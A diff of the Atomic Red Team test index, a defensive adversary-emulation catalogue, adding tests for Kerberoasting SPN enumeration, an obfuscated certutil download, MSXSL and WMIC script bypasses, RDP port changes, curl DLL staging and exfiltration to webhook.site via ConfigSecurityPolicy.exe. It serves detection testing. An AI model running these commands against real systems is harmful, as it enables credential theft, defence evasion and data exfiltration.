@@ -2584,6 +2584,94 @@ credential-access:
 '
         name: powershell
         elevation_required: false
+    - name: Extract all accounts in use as SPN using setspn
+      auto_generated_guid: e6f4affd-d826-4871-9a62-6c9004b8fe06
+      description: "The following test will utilize setspn to extract the Service
+        Principal Names. This behavior is typically used during a kerberos or silver
+        ticket attack. \nA successful execution will output all the SPNs for the related
+        domain. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain_name:
+          description: The Domain Name to lookup against
+          type: String
+          default: "%USERDNSDOMAIN%"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      executor:
+        command: 'setspn -T #{domain_name} -Q */*
+
+'
+        name: command_prompt
+    - name: Request A Single Ticket via PowerShell
+      auto_generated_guid: 988539bc-2ed7-4e62-aec6-7c5cf6680863
+      description: "The following test will utilize native PowerShell Identity modules
+        to query the domain to extract the Service Principal Names for a single computer.
+        This behavior is typically used during a kerberos or silver ticket attack.
+        \nA successful execution will output the SPNs for the endpoint in question.\n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      executor:
+        command: "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\')
+          + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+          -ArgumentList \"HTTP/$ComputerFQDN\" \n"
+        name: powershell
+    - name: Request All Tickets via PowerShell
+      auto_generated_guid: 902f4ed2-1aba-4133-90f2-cff6d299d6da
+      description: "The following test will utilize native PowerShell Identity modules
+        to query the domain to extract allthe Service Principal Names. This behavior
+        is typically used during a kerberos or silver ticket attack. \nA successful
+        execution will output the SPNs for the domain in question.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain_name:
+          description: The Domain Name to lookup against
+          type: String
+          default: "%USERDNSDOMAIN%"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      executor:
+        command: "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name}
+          -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+          -ArgumentList $_.Context.PostContext[0].Trim() }  \n"
+        name: powershell
   T1555.001:
     technique:
       created: '2020-02-12T18:55:24.728Z'
@@ -3990,7 +4078,7 @@ credential-access:
 
 '
       executor:
-        command: 'wmic /node:#{target_host} shadowcopy call create Volume=#{drive_letter}
+        command: 'wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}
 
 '
         name: command_prompt
@@ -5118,7 +5206,7 @@ credential-access:
         domain:
           description: Domain FQDN
           type: String
-          default: contoso.com
+          default: "$env:UserDnsDomain"
         auth:
           description: authentication method to choose between "NTLM" and "Kerberos"
           type: String
@@ -5139,7 +5227,7 @@ credential-access:
 
           $DomainUsers | Foreach-Object {
             $user = $_
-            $password = "#{password}"
+            $password = '#{password}'
 
             $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
             $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
@@ -31701,6 +31789,32 @@ defense-evasion:
 
 '
         name: powershell
+    - name: Obfuscated Command Line using special Unicode characters
+      auto_generated_guid: e68b945c-52d0-4dd9-a5e8-d173d70c448f
+      description: |
+        This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. ᶠ) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).
+        Reference:
+        https://wietze.github.io/blog/windows-command-line-obfuscation
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        command: 'cmd /c certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file}
+          #{local_path}
+
+'
+        cleanup_command: 'del #{local_path} >nul 2>&1
+
+'
+        name: command_prompt
   T1218.008:
     technique:
       id: attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071
@@ -38777,9 +38891,9 @@ defense-evasion:
     - name: MSXSL Bypass using local files
       auto_generated_guid: ca23bfb2-023f-49c5-8802-e66997de462d
       description: "Executes the code specified within a XSL script tag during XSL
-        transformation using a local payload. \nRequires download of MSXSL from Microsoft
-        (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714
-        ). \nOpen Calculator.exe when test sucessfully executed, while AV turned off.\n"
+        transformation using a local payload. \nRequires download of MSXSL. No longer
+        available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714
+        ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -38791,6 +38905,10 @@ defense-evasion:
           description: Location of the test XSL script file on the local filesystem.
           type: Path
           default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
+        msxsl_exe:
+          description: Location of the MSXSL executable.
+          type: Path
+          default: PathToAtomicsFolder\T1220\bin\msxsl.exe
       dependency_executor_name: powershell
       dependencies:
       - description: 'XML file must exist on disk at specified location (#{xmlfile})
@@ -38800,7 +38918,7 @@ defense-evasion:
 
 '
         get_prereq_command: |
-          New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null
+          New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction Ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
       - description: 'XSL file must exist on disk at specified location (#{xslfile})
 
@@ -38809,7 +38927,7 @@ defense-evasion:
 
 '
         get_prereq_command: |
-          New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
+          New-Item -Type Directory (split-path #{xslfile}) -ErrorAction Ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
       - description: 'msxsl.exe must exist on disk at specified location (#{msxsl_exe})
 
@@ -38817,23 +38935,23 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{msxsl_exe}) {exit 0} else {exit 1}
 
 '
-        get_prereq_command: |
-          Invoke-WebRequest "https://web.archive.org/web/20200803205229/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "$env:TEMP\msxsl.exe"
-          Copy-Item $env:TEMP\msxsl.exe #{msxsl_exe} -Force
-          Remove-Item $env:TEMP\msxsl.exe
+        get_prereq_command: 'Invoke-WebRequest "https://web.archive.org/web/20200803205229/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe"
+          -OutFile "#{msxsl_exe}"
+
+'
       executor:
-        command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+        command: "#{msxsl_exe} #{xmlfile} #{xslfile}\n"
+        cleanup_command: 'Remove-Item -Path #{msxsl_exe} -Force -ErrorAction Ignore
 
 '
         name: command_prompt
     - name: MSXSL Bypass using remote files
       auto_generated_guid: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
-      description: 'Executes the code specified within a XSL script tag during XSL
-        transformation using a remote payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
-        when test sucessfully executed, while AV turned off.
-
-'
+      description: |
+        Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
+        Requires download of MSXSL.exe. No longer available from Microsoft.
+        (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
+        Open Calculator.exe when test successfully executed, while AV turned off.
       supported_platforms:
       - windows
       input_arguments:
@@ -38845,8 +38963,25 @@ defense-evasion:
           description: Remote location (URL) of the test XSL script file.
           type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+        msxsl_exe:
+          description: Location of the MSXSL executable.
+          type: Path
+          default: PathToAtomicsFolder\T1220\bin\msxsl.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'msxsl.exe must exist on disk at specified location (#{msxsl_exe})
+
+'
+        prereq_command: 'if (Test-Path #{msxsl_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "https://web.archive.org/web/20200803205229/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe"
+          -OutFile "#{msxsl_exe}"
+
+'
       executor:
-        command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+        command: "#{msxsl_exe} #{xmlfile} #{xslfile}\n"
+        cleanup_command: 'Remove-Item -Path #{msxsl_exe} -Force -ErrorAction Ignore
 
 '
         name: command_prompt
@@ -38876,7 +39011,7 @@ defense-evasion:
 
 '
         get_prereq_command: |
-          New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null
+          New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction Ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         command: 'wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
@@ -38886,7 +39021,7 @@ defense-evasion:
     - name: WMIC bypass using remote XSL file
       auto_generated_guid: 7f5be499-33be-4129-a560-66021f379b9b
       description: 'Executes the code specified within a XSL script using a remote
-        payload. Open Calculator.exe when test sucessfully executed, while AV turned
+        payload. Open Calculator.exe when test successfully executed, while AV turned
         off.
 
 '
@@ -53788,19 +53923,6 @@ discovery:
 
 '
         name: command_prompt
-    - name: Enumerate logged on users via PowerShell
-      auto_generated_guid: 2bdc42c7-8907-40c2-9c2b-42919a00fe03
-      description: 'Enumerate logged on users via PowerShell. Upon exeuction, logged
-        on users will be displayed.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        command: 'query user
-
-'
-        name: powershell
   T1069.001:
     technique:
       external_references:
@@ -63489,9 +63611,9 @@ execution:
     - name: Execute a Command as a Service
       auto_generated_guid: 2382dee2-a75f-49aa-9378-f52df6ed3fb1
       description: |
-        Creates a service specifying an aribrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.
+        Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.
 
-        Upon successful execution, cmd.exe create a new service using sc.exe create that will start powershell.exe to create a new file `art-marker.txt`
+        Upon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`
       supported_platforms:
       - windows
       input_arguments:
@@ -65561,7 +65683,7 @@ lateral-movement:
           $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
           if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
         name: powershell
-    - name: Changing RDP Port to Non Standard Port
+    - name: Changing RDP Port to Non Standard Port via Powershell
       auto_generated_guid: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771
       description: 'Changing RDP Port to Non Standard Port via Remote Desktop Application
         over Powershell
@@ -65584,8 +65706,33 @@ lateral-movement:
           New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
         cleanup_command: "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal
           Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{OLD_Remote_Port}\nRemove-NetFirewallRule
-          -DisplayName \"RDPPORTLatest-TCP-In\"  \n"
+          -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction ignore \n"
         name: powershell
+    - name: Changing RDP Port to Non Standard Port via Command_Prompt
+      auto_generated_guid: 74ace21e-a31c-4f7d-b540-53e4eb6d1f73
+      description: 'Changing RDP Port to Non Standard Port via Command_Prompt
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        OLD_Remote_Port:
+          description: Default RDP Listening Port
+          type: String
+          default: '3389'
+        NEW_Remote_Port:
+          description: New RDP Listening Port
+          type: String
+          default: '4489'
+      executor:
+        command: |
+          reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} -f
+          netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
+        cleanup_command: |
+          reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} -f >nul 2>&1
+          netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1563:
     technique:
       external_references:
@@ -68131,6 +68278,48 @@ command-and-control:
           #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\ncmd.exe
           /c \"del $file_to_be_removed\"\n"
         name: powershell
+    - name: Curl Download File
+      auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
+      description: |
+        The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
+        Expected output will include whether the file downloaded successfully or not.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_download:
+          description: File to download
+          type: String
+          default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+        curl_path:
+          description: path to curl.exe
+          type: Path
+          default: C:\Windows\System32\Curl.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Curl must be installed on system.
+
+'
+        prereq_command: 'if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
+          Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
+          Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
+          Remove-Item $env:temp\curl
+          Remove-Item $env:temp\curl.zip
+      executor:
+        command: |
+          #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
+          #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
+          #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
+          #{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
+        cleanup_command: |
+          del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+          del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+          del c:\programdata\allthethingsx64.dll >nul 2>&1
+          del %Temp%\allthethingsx64.dll >nul 2>&1
+        name: command_prompt
   T1090.001:
     technique:
       external_references:
@@ -70575,7 +70764,20 @@ exfiltration:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1567
+    atomic_tests:
+    - name: Data Exfiltration with ConfigSecurityPolicy
+      auto_generated_guid: 5568a8f4-a8b1-4c40-9399-4969b642f122
+      description: |
+        Exfiltration of data using ConfigSecurityPolicy.exe
+        https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $path = resolve-path "c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe"
+          & $path[0] c:\temp\config.xml "https://webhook.site?d=sensitive-data-here"
+        name: powershell
   T1052.001:
     technique:
       external_references:
